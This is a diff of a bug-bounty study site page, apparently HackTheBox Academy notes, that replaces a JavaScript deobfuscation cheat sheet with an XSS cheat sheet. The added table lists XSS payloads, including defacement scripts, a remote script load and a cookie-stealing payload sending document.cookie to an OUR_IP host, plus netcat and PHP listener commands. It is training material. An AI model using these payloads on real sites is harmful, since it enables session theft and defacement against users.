@@ -9,10 +9,10 @@
       
       
       
-        <link rel="prev" href="../attacking-web-applications-with-ffuf/">
+        <link rel="prev" href="../javascript-deobfuscation/">
       
       
-        <link rel="next" href="../cross-site-scripting-%28xss%29/">
+        <link rel="next" href="../sql-injection-fundamentals/">
       
       
       <link rel="icon" href="../../assets/images/favicon.png">
@@ -20,7 +20,7 @@
     
     
       
-        <title>JavaScript Deobfuscation - Bug Bounty Hub</title>
+        <title>Cross-Site Scripting (XSS) - Bug Bounty Hub</title>
       
     
     
@@ -62,7 +62,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#javascript-deobfuscation" class="md-skip">
+        <a href="#cross-site-scripting-xss" class="md-skip">
           Skip to content
         </a>
       
@@ -98,7 +98,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              JavaScript Deobfuscation
+              Cross-Site Scripting (XSS)
             
           </span>
         </div>
@@ -431,6 +431,29 @@
                 
   
   
+  
+  
+    <li class="md-nav__item">
+      <a href="../javascript-deobfuscation/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    JavaScript Deobfuscation
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
     
   
   
@@ -448,7 +471,7 @@
   
   
   <span class="md-ellipsis">
-    JavaScript Deobfuscation
+    Cross-Site Scripting (XSS)
     
   </span>
   
@@ -461,7 +484,7 @@
   
   
   <span class="md-ellipsis">
-    JavaScript Deobfuscation
+    Cross-Site Scripting (XSS)
     
   </span>
   
@@ -484,9 +507,9 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#terms" class="md-nav__link">
+  <a href="#xss-payloads" class="md-nav__link">
     <span class="md-ellipsis">
-      Terms
+      XSS Payloads
     </span>
   </a>
   
@@ -501,51 +524,10 @@
   
 </li>
       
-        <li class="md-nav__item">
-  <a href="#useful-websites" class="md-nav__link">
-    <span class="md-ellipsis">
-      Useful Websites
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#misc" class="md-nav__link">
-    <span class="md-ellipsis">
-      Misc
-    </span>
-  </a>
-  
-</li>
-      
     </ul>
   
 </nav>
       
-    </li>
-  
-
-              
-            
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../cross-site-scripting-%28xss%29/" class="md-nav__link">
-        
-  
-  
-  <span class="md-ellipsis">
-    Cross-Site Scripting (XSS)
-    
-  </span>
-  
-
-      </a>
     </li>
   
 
@@ -984,9 +966,9 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#terms" class="md-nav__link">
+  <a href="#xss-payloads" class="md-nav__link">
     <span class="md-ellipsis">
-      Terms
+      XSS Payloads
     </span>
   </a>
   
@@ -996,24 +978,6 @@
   <a href="#commands" class="md-nav__link">
     <span class="md-ellipsis">
       Commands
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#useful-websites" class="md-nav__link">
-    <span class="md-ellipsis">
-      Useful Websites
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#misc" class="md-nav__link">
-    <span class="md-ellipsis">
-      Misc
     </span>
   </a>
   
@@ -1035,43 +999,59 @@
 
 
 
-<h1 id="javascript-deobfuscation">JavaScript Deobfuscation</h1>
-<h2 id="terms">Terms</h2>
+<h1 id="cross-site-scripting-xss">Cross-Site Scripting (XSS)</h1>
+<h2 id="xss-payloads">XSS Payloads</h2>
 <table>
 <thead>
 <tr>
-<th>Term</th>
+<th>Code</th>
 <th>Description</th>
 </tr>
 </thead>
 <tbody>
 <tr>
-<td>Code minification</td>
-<td>Reduces code to a single line often saved as .min.js.</td>
+<td><code>&lt;script&gt;alert(window.origin)&lt;/script&gt;</code></td>
+<td>Basic XSS Payload</td>
 </tr>
 <tr>
-<td>Packing</td>
-<td>Obfuscation recognizable from the six function arguments used in the initial function "function(p,a,c,k,e,d)".</td>
+<td><code>&lt;plaintext&gt;</code></td>
+<td>Basic XSS Payload</td>
 </tr>
 <tr>
-<td>JSFuck</td>
-<td>Programming style based in the atomic parts of JS. Uses only ()+[]! (aa and jj encode are similar).</td>
+<td><code>&lt;script&gt;print()&lt;/script&gt;</code></td>
+<td>Basic XSS Payload</td>
 </tr>
 <tr>
-<td>Base 64</td>
-<td>Contains only alpha-numeric, + and /. Padded with '='.</td>
+<td><code>&lt;img src="" onerror=alert(window.origin)&gt;</code></td>
+<td>HTML-based XSS Payload</td>
 </tr>
 <tr>
-<td>Hex</td>
-<td>Encodes each char into its hex on the ASCII table. Contains 0-9 and a-f.</td>
+<td><code>&lt;script&gt;document.body.style.background = "#141d2b"&lt;/script&gt;</code></td>
+<td>Change Background Color</td>
 </tr>
 <tr>
-<td>Ceasar</td>
-<td>Shifts each char by a fixed number</td>
+<td><code>&lt;script&gt;document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"&lt;/script&gt;</code></td>
+<td>Change Background Image</td>
 </tr>
 <tr>
-<td>Rot13</td>
-<td>Most common ceaser cipher, shifts by 13</td>
+<td><code>&lt;script&gt;document.title = 'HackTheBox Academy'&lt;/script&gt;</code></td>
+<td>Change Website Title</td>
+</tr>
+<tr>
+<td><code>&lt;script&gt;document.getElementsByTagName('body')[0].innerHTML = 'text'&lt;/script&gt;</code></td>
+<td>Overwrite website's main body</td>
+</tr>
+<tr>
+<td><code>&lt;script&gt;document.getElementById('urlform').remove();&lt;/script&gt;</code></td>
+<td>Remove certain HTML element</td>
+</tr>
+<tr>
+<td><code>&lt;script src="http://OUR_IP/script.js"&gt;&lt;/script&gt;</code></td>
+<td>Load remote script</td>
+</tr>
+<tr>
+<td><code>&lt;script&gt;new Image().src='http://OUR_IP/index.php?c='+document.cookie&lt;/script&gt;</code></td>
+<td>Send Cookie details to us</td>
 </tr>
 </tbody>
 </table>
@@ -1085,126 +1065,16 @@
 </thead>
 <tbody>
 <tr>
-<td><code>curl http://SERVER_IP:PORT/</code></td>
-<td>cURL GET request</td>
+<td><code>python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"</code></td>
+<td>Run xsstrike on a url parameter</td>
 </tr>
 <tr>
-<td><code>curl -s http://SERVER_IP:PORT/ -X POST</code></td>
-<td>cURL POST request</td>
+<td><code>sudo nc -lvnp 80</code></td>
+<td>Start netcat listener</td>
 </tr>
 <tr>
-<td><code>curl -s http://SERVER_IP:PORT/ -X POST -d "param1=sample"</code></td>
-<td>cURL POST with data</td>
-</tr>
-<tr>
-<td><code>echo hackthebox | base64</code></td>
-<td>base64 encode</td>
-</tr>
-<tr>
-<td><code>echo ENCODED_B64 | base64 -d</code></td>
-<td>base64 decode</td>
-</tr>
-<tr>
-<td><code>echo hackthebox | xxd -p</code></td>
-<td>hex encode</td>
-</tr>
-<tr>
-<td><code>echo ENCODED_HEX | xxd -p -r</code></td>
-<td>hex decode</td>
-</tr>
-<tr>
-<td><code>echo hackthebox | tr 'A-Za-z' 'N-ZA-Mn-za-m'</code></td>
-<td>rot13 encode</td>
-</tr>
-<tr>
-<td><code>echo ENCODED_ROT13 | tr 'A-Za-z' 'N-ZA-Mn-za-m'</code></td>
-<td>rot13 decode</td>
-</tr>
-</tbody>
-</table>
-<h2 id="useful-websites">Useful Websites</h2>
-<table>
-<thead>
-<tr>
-<th>Site</th>
-<th>Description</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><a href="https://jsconsole.com/">JS Console</a></td>
-<td>Interactive JavaScript console for testing code.</td>
-</tr>
-<tr>
-<td><a href="https://www.toptal.com/developers/javascript-minifier">JS Minifier</a></td>
-<td>Minifies JavaScript for performance optimization.</td>
-</tr>
-<tr>
-<td><a href="https://beautifytools.com/javascript-obfuscator.php">BeatifyTools</a></td>
-<td>Obfuscates JavaScript to protect code.</td>
-</tr>
-<tr>
-<td><a href="https://obfuscator.io/">JS Obfuscator Tool</a></td>
-<td>Tool to obfuscate JavaScript code securely.</td>
-</tr>
-<tr>
-<td><a href="https://jsfuck.com/">JSFuck</a></td>
-<td>Encodes JavaScript using only six characters.</td>
-</tr>
-<tr>
-<td><a href="https://utf-8.jp/public/jjencode.html">jjencode</a></td>
-<td>Encodes JavaScript with JJEncode technique.</td>
-</tr>
-<tr>
-<td><a href="https://utf-8.jp/public/aaencode.html">aaencode</a></td>
-<td>Encodes JavaScript with AAEncode method.</td>
-</tr>
-<tr>
-<td><a href="https://prettier.io/playground/">Prettier</a></td>
-<td>Formats and beautifies JavaScript code.</td>
-</tr>
-<tr>
-<td><a href="https://beautifier.io/">js-beautify</a></td>
-<td>Beautifies minified or obfuscated JavaScript.</td>
-</tr>
-<tr>
-<td><a href="https://matthewfl.com/unPacker.html">UnPacker</a></td>
-<td>Deobfuscates and unpacks JavaScript code.</td>
-</tr>
-<tr>
-<td><a href="https://rot13.com/">rot13.com</a></td>
-<td>Applies ROT13 encoding/decoding for text.</td>
-</tr>
-<tr>
-<td><a href="https://www.boxentriq.com/code-breaking/cipher-identifier">Cipher Identifier</a></td>
-<td>Identifies cipher types in encoded text.</td>
-</tr>
-</tbody>
-</table>
-<h2 id="misc">Misc</h2>
-<table>
-<thead>
-<tr>
-<th>Command/Action</th>
-<th>Description</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>ctrl+u</code></td>
-<td>Show HTML source code in Firefox</td>
-</tr>
-<tr>
-<td><code>ctrl+shift+z</code></td>
-<td>Open browser debugger tab</td>
-</tr>
-<tr>
-<td>'{ }' button</td>
-<td>Pretty print in debugger tab</td>
-</tr>
-<tr>
-<td>Unpack</td>
-<td>Replace eval function with console.log</td>
+<td><code>sudo php -S 0.0.0.0:80</code></td>
+<td>Start PHP server</td>
 </tr>
 </tbody>
 </table>
